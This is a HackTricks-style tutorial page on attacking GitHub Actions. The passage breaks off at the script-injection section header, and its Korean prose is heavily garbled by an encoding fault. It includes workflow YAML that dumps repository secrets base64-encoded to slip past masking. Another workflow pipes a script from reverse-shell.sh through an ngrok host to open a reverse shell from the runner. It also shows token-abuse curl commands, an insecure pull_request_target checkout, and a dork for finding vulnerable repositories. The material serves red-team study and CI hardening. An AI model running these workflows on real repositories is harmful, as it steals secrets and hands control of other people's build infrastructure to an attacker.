# Abusing Github Actions

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

ì´ í˜ì´ì§€ì—ì„œëŠ” ë‹¤ìŒì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ê³µê²©ìê°€ Github Actionì— ì ‘ê·¼í•˜ëŠ” ëª¨ë“  **ì˜í–¥ì˜ ìš”ì•½**
* **ì•¡ì„¸ìŠ¤í•˜ëŠ” ë‹¤ì–‘í•œ ë°©ë²•**:
* ì•¡ì…˜ì„ ìƒì„±í•  **ê¶Œí•œ**ì„ ê°€ì§€ê¸°
* **í’€ ë¦¬í€˜ìŠ¤íŠ¸** ê´€ë ¨ íŠ¸ë¦¬ê±° ë‚¨ìš©
* **ê¸°íƒ€ ì™¸ë¶€ ì ‘ê·¼** ê¸°ìˆ  ë‚¨ìš©
* ì´ë¯¸ ì†ìƒëœ ë ˆí¬ì—ì„œ **í”¼ë²—**í•˜ê¸°
* ë§ˆì§€ë§‰ìœ¼ë¡œ, **ë‚´ë¶€ì—ì„œ ì•¡ì…˜ì„ ë‚¨ìš©í•˜ê¸° ìœ„í•œ í¬ìŠ¤íŠ¸ ìµìŠ¤í”Œë¡œì‡ ê¸°ìˆ **ì— ëŒ€í•œ ì„¹ì…˜ (ì–¸ê¸‰ëœ ì˜í–¥ì„ ì´ˆë˜í•¨)

## Impacts Summary

[**Github Actionsì— ëŒ€í•œ ê¸°ë³¸ ì •ë³´**](../basic-github-information.md#github-actions)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

ë§Œì•½ **ì„ì˜ì˜ Github actionsë¥¼ ì‹¤í–‰/ì½”ë“œë¥¼ ì£¼ì…**í•  ìˆ˜ ìˆë‹¤ë©´, ë‹¤ìŒì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* í•´ë‹¹ ë ˆí¬/ì¡°ì§ì˜ **ë¹„ë°€**ì„ **í›”ì¹˜ê¸°**.
* ì£¼ì…ë§Œ í•  ìˆ˜ ìˆë‹¤ë©´, ì›Œí¬í”Œë¡œìš°ì— ì´ë¯¸ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ë ˆí¬ ê¶Œí•œ**ì„ ë‚¨ìš©í•˜ì—¬ AWS ë° GCPì™€ ê°™ì€ ë‹¤ë¥¸ í”Œë«í¼ì— ì ‘ê·¼í•˜ê¸°.
* **ì»¤ìŠ¤í…€ ì›Œì»¤ì—ì„œ ì½”ë“œ ì‹¤í–‰** (ì»¤ìŠ¤í…€ ì›Œì»¤ê°€ ì‚¬ìš©ë˜ëŠ” ê²½ìš°) ë° ê±°ê¸°ì„œ í”¼ë²— ì‹œë„í•˜ê¸°.
* ë ˆí¬ì§€í† ë¦¬ **ì½”ë“œ**ë¥¼ **ë®ì–´ì“°ê¸°**.
* ì´ëŠ” `GITHUB_TOKEN`ì˜ ê¶Œí•œì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤ (ìˆë‹¤ë©´).
* **ë°°í¬** ë° ê¸°íƒ€ **ì•„í‹°íŒ©íŠ¸**ë¥¼ **ì†ìƒ**ì‹œí‚¤ê¸°.
* ì½”ë“œê°€ ë¬´ì–¸ê°€ë¥¼ ë°°í¬í•˜ê±°ë‚˜ ì €ì¥í•˜ê³  ìˆë‹¤ë©´, ì´ë¥¼ ìˆ˜ì •í•˜ì—¬ ì¶”ê°€ ì ‘ê·¼ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## GITHUB\_TOKEN

ì´ "**ë¹„ë°€**" (`${{ secrets.GITHUB_TOKEN }}` ë° `${{ github.token }}`ì—ì„œ ì˜¤ëŠ”)ì€ ê´€ë¦¬ìê°€ ì´ ì˜µì…˜ì„ í™œì„±í™”í•  ë•Œ ì œê³µë©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

ì´ í† í°ì€ **Github ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‚¬ìš©í• ** ë™ì¼í•œ ê²ƒìœ¼ë¡œ, ë™ì¼í•œ ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
GithubëŠ” **ë ˆí¬ ê°„** ì ‘ê·¼ì„ í—ˆìš©í•˜ëŠ” [**íë¦„**](https://github.com/github/roadmap/issues/74)ì„ ì¶œì‹œí•´ì•¼ í•˜ë©°, ì´ë¥¼ í†µí•´ ë ˆí¬ê°€ `GITHUB_TOKEN`ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë‚´ë¶€ ë ˆí¬ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ì´ í† í°ì˜ ê°€ëŠ¥í•œ **ê¶Œí•œ**ì€ ë‹¤ìŒì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

í† í°ì€ **ì‘ì—…ì´ ì™„ë£Œëœ í›„ ë§Œë£Œ**ë©ë‹ˆë‹¤.\
ì´ í† í°ì€ ë‹¤ìŒê³¼ ê°™ì€ í˜•ì‹ì…ë‹ˆë‹¤: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

ì´ í† í°ìœ¼ë¡œ í•  ìˆ˜ ìˆëŠ” ëª‡ ê°€ì§€ í¥ë¯¸ë¡œìš´ ì‘ì—…:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="PR ìŠ¹ì¸" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR ìƒì„±" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
ì—¬ëŸ¬ ê²½ìš°ì— **Github Actions envs ë˜ëŠ” secrets ì•ˆì—ì„œ github ì‚¬ìš©ì í† í°ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ í† í°ì€ ë¦¬í¬ì§€í† ë¦¬ì™€ ì¡°ì§ì— ëŒ€í•œ ë” ë§ì€ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

<details>

<summary>Github Action ì¶œë ¥ì—ì„œ ë¹„ë°€ ëª©ë¡</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>ë¹„ë°€ì„ ì´ìš©í•œ ë¦¬ë²„ìŠ¤ ì…¸ ì–»ê¸°</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ Github Tokenì— ë¶€ì—¬ëœ ê¶Œí•œì„ **ë¡œê·¸ë¥¼ í™•ì¸í•˜ì—¬** í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## í—ˆìš©ëœ ì‹¤í–‰

{% hint style="info" %}
ì´ê²ƒì€ Github actionsë¥¼ ì†ìƒì‹œí‚¤ëŠ” ê°€ì¥ ì‰¬ìš´ ë°©ë²•ì´ ë  ê²ƒì…ë‹ˆë‹¤. ì´ ê²½ìš°ëŠ” **ì¡°ì§ì—ì„œ ìƒˆ ë¦¬í¬ë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œ**ì´ ìˆê±°ë‚˜ **ë¦¬í¬ì§€í† ë¦¬ì— ëŒ€í•œ ì“°ê¸° ê¶Œí•œ**ì´ ìˆëŠ” ê²½ìš°ë¥¼ ê°€ì •í•©ë‹ˆë‹¤.

ì´ ì‹œë‚˜ë¦¬ì˜¤ì— ìˆë‹¤ë©´ [Post Exploitation techniques](./#post-exploitation-techniques-from-inside-an-action)ë¥¼ í™•ì¸í•˜ë©´ ë©ë‹ˆë‹¤.
{% endhint %}

### ë¦¬í¬ ìƒì„±ì—ì„œì˜ ì‹¤í–‰

ì¡°ì§ì˜ êµ¬ì„±ì›ì´ **ìƒˆ ë¦¬í¬ë¥¼ ìƒì„±í•  ìˆ˜** ìˆê³  Github actionsë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê²½ìš°, **ìƒˆ ë¦¬í¬ë¥¼ ìƒì„±í•˜ê³  ì¡°ì§ ìˆ˜ì¤€ì—ì„œ ì„¤ì •ëœ ë¹„ë°€ì„ í›”ì¹  ìˆ˜** ìˆìŠµë‹ˆë‹¤.

### ìƒˆ ë¸Œëœì¹˜ì—ì„œì˜ ì‹¤í–‰

ì´ë¯¸ Github Actionì´ êµ¬ì„±ëœ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ **ìƒˆ ë¸Œëœì¹˜ë¥¼ ìƒì„±í•  ìˆ˜** ìˆë‹¤ë©´, **ìˆ˜ì •**í•˜ê³ , **ë‚´ìš©ì„ ì—…ë¡œë“œ**í•œ ë‹¤ìŒ **ìƒˆ ë¸Œëœì¹˜ì—ì„œ í•´ë‹¹ ì•¡ì…˜ì„ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ **ë¦¬í¬ì§€í† ë¦¬ ë° ì¡°ì§ ìˆ˜ì¤€ì˜ ë¹„ë°€ì„ ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(í•˜ì§€ë§Œ ê·¸ë“¤ì´ ì–´ë–»ê²Œ ë¶ˆë¦¬ëŠ”ì§€ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤).

ìˆ˜ì •ëœ ì•¡ì…˜ì„ **ìˆ˜ë™ìœ¼ë¡œ** ì‹¤í–‰ ê°€ëŠ¥í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. **PRì´ ìƒì„±ë  ë•Œ** ë˜ëŠ” **ì½”ë“œê°€ í‘¸ì‹œë  ë•Œ**(ì–¼ë§ˆë‚˜ ì†Œë€ì„ í”¼ìš°ê³  ì‹¶ì€ì§€ì— ë”°ë¼ ë‹¤ë¦„):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## í¬í¬ëœ ì‹¤í–‰

{% hint style="info" %}
ê³µê²©ìê°€ **ë‹¤ë¥¸ ë¦¬í¬ì§€í† ë¦¬ì˜ Github Actionì„ ì‹¤í–‰**í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ë‹¤ì–‘í•œ íŠ¸ë¦¬ê±°ê°€ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ íŠ¸ë¦¬ê±° ê°€ëŠ¥í•œ ì‘ì—…ì´ ì˜ëª» êµ¬ì„±ëœ ê²½ìš°, ê³µê²©ìê°€ ì´ë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### `pull_request`

ì›Œí¬í”Œë¡œìš° íŠ¸ë¦¬ê±° **`pull_request`**ëŠ” ëª‡ ê°€ì§€ ì˜ˆì™¸ê°€ ìˆì„ ë•Œë§ˆë‹¤ í’€ ë¦¬í€˜ìŠ¤íŠ¸ê°€ ìˆ˜ì‹ ë  ë•Œ ì›Œí¬í”Œë¡œìš°ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤: ê¸°ë³¸ì ìœ¼ë¡œ **ì²« ë²ˆì§¸**ë¡œ **í˜‘ì—…**í•˜ëŠ” ê²½ìš°, ì¼ë¶€ **ìœ ì§€ ê´€ë¦¬ìê°€** ì›Œí¬í”Œë¡œìš°ì˜ **ì‹¤í–‰**ì„ **ìŠ¹ì¸**í•´ì•¼ í•©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**ê¸°ë³¸ ì œí•œ**ì´ **ì²« ë²ˆì§¸** ê¸°ì—¬ìì—ê²Œ í•´ë‹¹ë˜ë¯€ë¡œ, **ìœ íš¨í•œ ë²„ê·¸/ì˜¤íƒ€ë¥¼ ìˆ˜ì •**í•˜ì—¬ ê¸°ì—¬í•œ í›„ **ìƒˆë¡œìš´ `pull_request` ê¶Œí•œì„ ë‚¨ìš©í•˜ê¸° ìœ„í•´ ë‹¤ë¥¸ PRì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

**ì´ê²ƒì„ í…ŒìŠ¤íŠ¸í–ˆì§€ë§Œ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**: ~~ë˜ ë‹¤ë¥¸ ì˜µì…˜ì€ í”„ë¡œì íŠ¸ì— ê¸°ì—¬í•œ ì‚¬ëŒì˜ ì´ë¦„ìœ¼ë¡œ ê³„ì •ì„ ë§Œë“¤ê³  ê·¸ì˜ ê³„ì •ì„ ì‚­ì œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.~~
{% endhint %}

ê²Œë‹¤ê°€, ê¸°ë³¸ì ìœ¼ë¡œ **ì“°ê¸° ê¶Œí•œ**ê³¼ **ë¹„ë°€ ì ‘ê·¼**ì„ ëŒ€ìƒ ë¦¬í¬ì§€í† ë¦¬ì— ë°©ì§€í•©ë‹ˆë‹¤. [**ë¬¸ì„œ**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)ì—ì„œ ì–¸ê¸‰í•œ ë°”ì™€ ê°™ì´:

> `GITHUB_TOKEN`ì„ ì œì™¸í•˜ê³ , **ë¹„ë°€ì€** **í¬í¬ëœ** ë¦¬í¬ì§€í† ë¦¬ì—ì„œ ì›Œí¬í”Œë¡œìš°ê°€ íŠ¸ë¦¬ê±°ë  ë•Œ **ëŸ¬ë„ˆì— ì „ë‹¬ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. **`GITHUB_TOKEN`ì€ í¬í¬ëœ ë¦¬í¬ì§€í† ë¦¬ì˜ í’€ ë¦¬í€˜ìŠ¤íŠ¸ì—ì„œ ì½ê¸° ì „ìš© ê¶Œí•œì„ ê°€ì§‘ë‹ˆë‹¤**.

ê³µê²©ìëŠ” Github Actionì˜ ì •ì˜ë¥¼ ìˆ˜ì •í•˜ì—¬ ì„ì˜ì˜ ì‘ì—…ì„ ì‹¤í–‰í•˜ê³  ì„ì˜ì˜ ì‘ì—…ì„ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì–¸ê¸‰ëœ ì œí•œìœ¼ë¡œ ì¸í•´ ë¹„ë°€ì„ í›”ì¹˜ê±°ë‚˜ ë¦¬í¬ë¥¼ ë®ì–´ì“¸ ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤.

{% hint style="danger" %}
**ë„¤, ê³µê²©ìê°€ PRì—ì„œ íŠ¸ë¦¬ê±°ë  Github Actionì„ ë³€ê²½í•˜ë©´, ê·¸ì˜ Github Actionì´ ì‚¬ìš©ë˜ê³  ì›ë³¸ ë¦¬í¬ì˜ ê²ƒì´ ì•„ë‹™ë‹ˆë‹¤!**
{% endhint %}

ê³µê²©ìê°€ ì‹¤í–‰ë˜ëŠ” ì½”ë“œë¥¼ ì œì–´í•˜ë¯€ë¡œ, `GITHUB_TOKEN`ì— ë¹„ë°€ì´ë‚˜ ì“°ê¸° ê¶Œí•œì´ ì—†ë”ë¼ë„ ê³µê²©ìëŠ” ì˜ˆë¥¼ ë“¤ì–´ **ì•…ì„± ì•„í‹°íŒ©íŠ¸ë¥¼ ì—…ë¡œë“œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **`pull_request_target`**

ì›Œí¬í”Œë¡œìš° íŠ¸ë¦¬ê±° **`pull_request_target`**ì€ ëŒ€ìƒ ë¦¬í¬ì§€í† ë¦¬ì— **ì“°ê¸° ê¶Œí•œ**ê³¼ **ë¹„ë°€ ì ‘ê·¼**ì„ ê°€ì§‘ë‹ˆë‹¤(ê·¸ë¦¬ê³  ê¶Œí•œ ìš”ì²­ì„ í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤).

ì›Œí¬í”Œë¡œìš° íŠ¸ë¦¬ê±° **`pull_request_target`**ì€ **PRì—ì„œ ì œê³µëœ ê²ƒ**ì´ ì•„ë‹ˆë¼ **ê¸°ë³¸ ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì‹¤í–‰**ëœë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤(ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½”ë“œë¥¼ **ì‹¤í–‰í•˜ì§€ ì•Šê¸° ìœ„í•´**). `pull_request_target`ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [**ë¬¸ì„œ**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤.\
ë˜í•œ, ì´ íŠ¹ì • ìœ„í—˜í•œ ì‚¬ìš©ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [**github ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)ì„ í™•ì¸í•˜ì‹­ì‹œì˜¤.

**ì‹¤í–‰ëœ ì›Œí¬í”Œë¡œìš°**ê°€ **ê¸°ë³¸**ì—ì„œ ì •ì˜ëœ ê²ƒì´ê³  **PR**ì—ì„œ ì •ì˜ëœ ê²ƒì´ ì•„ë‹ˆê¸° ë•Œë¬¸ì— **`pull_request_target`**ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ **ì•ˆì „í•´ ë³´ì¼ ìˆ˜ ìˆì§€ë§Œ**, **ì•ˆì „í•˜ì§€ ì•Šì€ ëª‡ ê°€ì§€ ê²½ìš°ê°€ ìˆìŠµë‹ˆë‹¤**.

ì´ê²ƒì€ **ë¹„ë°€ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) íŠ¸ë¦¬ê±°ëŠ” ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ê°€ `ì™„ë£Œ`, `ìš”ì²­ë¨` ë˜ëŠ” `ì§„í–‰ ì¤‘`ì¼ ë•Œ ì›Œí¬í”Œë¡œìš°ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

ì´ ì˜ˆì œì—ì„œëŠ” ë³„ë„ì˜ "í…ŒìŠ¤íŠ¸ ì‹¤í–‰" ì›Œí¬í”Œë¡œìš°ê°€ ì™„ë£Œëœ í›„ ì‹¤í–‰ë˜ë„ë¡ ì›Œí¬í”Œë¡œìš°ê°€ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ì›Œí¬í”Œë¡œìš°ëŠ” **ì™¸ë¶€ ì‚¬ìš©ìê°€** **`pull_request`** ë˜ëŠ” **`pull_request_target`**ì„ í†µí•´ **íŠ¸ë¦¬ê±°**í•  ìˆ˜ ìˆëŠ” **ì›Œí¬í”Œë¡œìš°**ì— **ì˜ì¡´**í•˜ëŠ” ê²½ìš° ê³µê²©ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ëª‡ ê°€ì§€ ì·¨ì•½í•œ ì˜ˆì‹œëŠ” [**ì´ ë¸”ë¡œê·¸ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** ì²« ë²ˆì§¸ëŠ” **`workflow_run`**ìœ¼ë¡œ íŠ¸ë¦¬ê±°ëœ ì›Œí¬í”Œë¡œìš°ê°€ ê³µê²©ìì˜ ì½”ë“œë¥¼ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤: `${{ github.event.pull_request.head.sha }}`\
ë‘ ë²ˆì§¸ëŠ” **ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ”** ì½”ë“œì—ì„œ **`workflow_run`** ì›Œí¬í”Œë¡œìš°ë¡œ **ì•„í‹°íŒ©íŠ¸**ë¥¼ **ì „ë‹¬**í•˜ê³  ì´ ì•„í‹°íŒ©íŠ¸ì˜ ë‚´ìš©ì„ **RCEì— ì·¨ì•½í•˜ê²Œ** ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

### `workflow_call`

TODO

TODO: `pull_request`ì—ì„œ ì‹¤í–‰ë  ë•Œ ì‚¬ìš©/ë‹¤ìš´ë¡œë“œëœ ì½”ë“œê°€ ì›ë³¸ì—ì„œ ì˜¨ ê²ƒì¸ì§€ í¬í¬ëœ PRì—ì„œ ì˜¨ ê²ƒì¸ì§€ í™•ì¸

## í¬í¬ëœ ì‹¤í–‰ ë‚¨ìš©

ì™¸ë¶€ ê³µê²©ìê°€ GitHub ì›Œí¬í”Œë¡œìš°ë¥¼ ì‹¤í–‰í•˜ë„ë¡ ë§Œë“œëŠ” ëª¨ë“  ë°©ë²•ì„ ì–¸ê¸‰í–ˆìŠµë‹ˆë‹¤. ì´ì œ ì´ëŸ¬í•œ ì‹¤í–‰ì´ ì˜ëª» êµ¬ì„±ëœ ê²½ìš° ì–´ë–»ê²Œ ë‚¨ìš©ë  ìˆ˜ ìˆëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤:

### ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì²´í¬ì•„ì›ƒ ì‹¤í–‰

**`pull_request`**ì˜ ê²½ìš°, ì›Œí¬í”Œë¡œìš°ëŠ” **PRì˜ ì»¨í…ìŠ¤íŠ¸**ì—ì„œ ì‹¤í–‰ë˜ë¯€ë¡œ **ì•…ì„± PRì˜ ì½”ë“œ**ë¥¼ ì‹¤í–‰í•˜ê²Œ ë©ë‹ˆë‹¤. í•˜ì§€ë§Œ ëˆ„êµ°ê°€ê°€ **ë¨¼ì € ì´ë¥¼ ìŠ¹ì¸í•´ì•¼** í•˜ë©°, [ì œí•œ ì‚¬í•­](./#pull_request)ê³¼ í•¨ê»˜ ì‹¤í–‰ë©ë‹ˆë‹¤.

**`pull_request_target` ë˜ëŠ” `workflow_run`**ì„ ì‚¬ìš©í•˜ëŠ” ì›Œí¬í”Œë¡œìš°ê°€ **`pull_request_target` ë˜ëŠ” `pull_request`**ì—ì„œ íŠ¸ë¦¬ê±°ë  ìˆ˜ ìˆëŠ” ì›Œí¬í”Œë¡œìš°ì— ì˜ì¡´í•˜ëŠ” ê²½ìš°, ì›ë³¸ ë¦¬í¬ì§€í† ë¦¬ì˜ ì½”ë“œê°€ ì‹¤í–‰ë˜ë¯€ë¡œ **ê³µê²©ìëŠ” ì‹¤í–‰ëœ ì½”ë“œë¥¼ ì œì–´í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.

{% hint style="danger" %}
ê·¸ëŸ¬ë‚˜ **ì•¡ì…˜**ì— **ëª…ì‹œì ì¸ PR ì²´í¬ì•„ì›ƒ**ì´ ìˆì–´ **ê¸°ë³¸ì´ ì•„ë‹Œ PRì—ì„œ ì½”ë“œë¥¼ ê°€ì ¸ì˜¤ëŠ” ê²½ìš°**, ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ì½”ë“œë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ (PR ì½”ë“œê°€ ë‹¤ìš´ë¡œë“œë˜ëŠ” 12ë²ˆì§¸ ì¤„ì„ í™•ì¸í•˜ì„¸ìš”):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

ì ì¬ì ìœ¼ë¡œ **ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½”ë“œëŠ” `npm install` ë˜ëŠ” `npm build` ì¤‘ì— ì‹¤í–‰ë©ë‹ˆë‹¤**. ë¹Œë“œ ìŠ¤í¬ë¦½íŠ¸ì™€ ì°¸ì¡°ëœ **íŒ¨í‚¤ì§€ëŠ” PR ì‘ì„±ìê°€ ì œì–´í•©ë‹ˆë‹¤**.

{% hint style="warning" %}
ì·¨ì•½í•œ ì•¡ì…˜ì„ ê²€ìƒ‰í•˜ê¸° ìœ„í•œ GitHub ë„í¬ëŠ”: `event.pull_request pull_request_target extension:yml`ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì•¡ì…˜ì´ ë¶ˆì•ˆì „í•˜ê²Œ êµ¬ì„±ë˜ë”ë¼ë„ ì‘ì—…ì„ ì•ˆì „í•˜ê²Œ ì‹¤í–‰í•˜ë„ë¡ êµ¬ì„±í•˜ëŠ” ë‹¤ì–‘í•œ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: PRì„ ìƒì„±í•˜ëŠ” í–‰ìœ„ìê°€ ëˆ„êµ¬ì¸ì§€ì— ëŒ€í•œ ì¡°ê±´ë¬¸ ì‚¬ìš©).
{% endhint %}

### ì»¨í…ìŠ¤íŠ¸ ìŠ¤í¬ë¦½íŠ¸ ì£¼ì… <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

